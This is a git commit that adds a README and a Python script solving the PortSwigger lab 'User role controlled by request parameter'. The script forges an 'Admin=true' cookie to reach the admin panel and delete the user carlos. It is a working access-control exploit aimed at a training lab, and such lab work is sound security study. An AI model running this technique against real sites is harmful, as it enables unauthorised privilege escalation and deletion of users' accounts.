01271605051851f35d1b389f242fab9b5d6b93d5
Ahmed Elqalawii <elqalawii@proton.me>
2023-09-04 22:38:47 +0300

    Added 'User role controlled by request parameter' lab

---
+++ Access control vulnerabilities/user_role_controlled_by_request_parameter/README.md
@@ -0,0 +1,23 @@
+# Hack Steps
+
+1. Change the cookie 'Admin' to 'true'
+2. Fetch the admin panel
+3. Delete carlos
+
+# Run Script
+
+1. Change the URL of the lab
+2. Start script
+
+```
+~$ python user_role_controlled_by_request_parameter.py
+```
+
+# Expected Output
+
+```
+1. Changing the cookie 'Admin' to 'true'.. OK
+2. Fetching the admin panel.. OK
+3. Deleting carlos.. OK
+[#] Check your browser, it should be marked now as solved
+```
---
+++ Access control vulnerabilities/user_role_controlled_by_request_parameter/user_role_controlled_by_request_parameter.py
@@ -0,0 +1,58 @@
+##########################################################################
+#
+# Author: Ahmed Elqalawii
+#
+# Date: 4/9/2023
+#
+# PortSwigger LAB: User role controlled by request parameter
+#
+# Steps: 1. Change the cookie 'Admin' to 'true'
+#        2. Fetch the admin panel
+#        3. Delete carlos
+#
+###########################################################################
+
+###########
+# imports
+###########
+import requests
+import re
+from colorama import Fore
+
+# change this url to your lab
+url = "https://0a69005f031d6f6781dd399b000b005a.web-security-academy.net"
+
+
+# fetch admin panel
+# this step is not necessary in the script, you can do step 2 directrly
+# it's a must only when solving the lab using the browser
+try:
+    cookies = {
+        "Admin": "true"
+    }
+    print(Fore.WHITE + "1. Changing the cookie 'Admin' to 'true'.. " + Fore.GREEN + "OK")
+
+    admin_panel = requests.get(
+        f"{url}/admin", cookies=cookies)
+    if admin_panel.status_code == 200:
+        print(
+            Fore.WHITE + "2. Fetching the admin panel.. " + Fore.GREEN + "OK")
+
+        try:  # delete the carlos
+            delete_carlos = requests.get(
+                f"{url}/admin/delete?username=carlos", cookies=cookies)
+            if delete_carlos.status_code == 200:
+                print(
+                    Fore.WHITE + "3. Deleting carlos.. " + Fore.GREEN + "OK")
+                print(
+                    Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
+            else:
+                print(Fore.RED + "[!] Failed to delete carlos")
+        except:
+            print(
+                Fore.RED + "[!] Failed to delete carlos through exception")
+    else:
+        print(Fore.RED + "[!] Failed to fetch admin panel")
+except:
+    print(
+        Fore.RED + "[!] Failed to fetch admin panel through exception")
